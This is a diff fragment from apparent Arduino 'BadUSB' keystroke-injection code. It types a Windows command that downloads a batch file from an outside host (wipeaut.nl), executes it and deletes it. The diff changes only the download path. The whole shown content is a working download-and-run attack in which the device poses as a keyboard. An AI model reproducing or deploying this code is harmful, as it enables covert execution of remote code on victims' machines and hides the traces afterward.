@@ -18,7 +18,7 @@ void exec() {
     Keyboard.press('r');
     delay(300);
     Keyboard.releaseAll();
-    Keyboard.print("cmd /c "+d+"cd %userprofile%\\Downloads && powershell "+d+"(New-Object System.Net.WebClient).DownloadFile("+s+"https://wipeaut.nl/badusb/win/"+sc+".bat"+s+", "+s+sc+".bat"+s+")"+d+" && "+sc+".bat && del "+sc+".bat"+d);
+    Keyboard.print("cmd /c "+d+"cd %userprofile%\\Downloads && powershell "+d+"(New-Object System.Net.WebClient).DownloadFile("+s+"https://wipeaut.nl/bad/win/"+sc+".bat"+s+", "+s+sc+".bat"+s+")"+d+" && "+sc+".bat && del "+sc+".bat"+d);
     delay(150);
     Keyboard.press(KEY_RETURN);
     Keyboard.releaseAll();
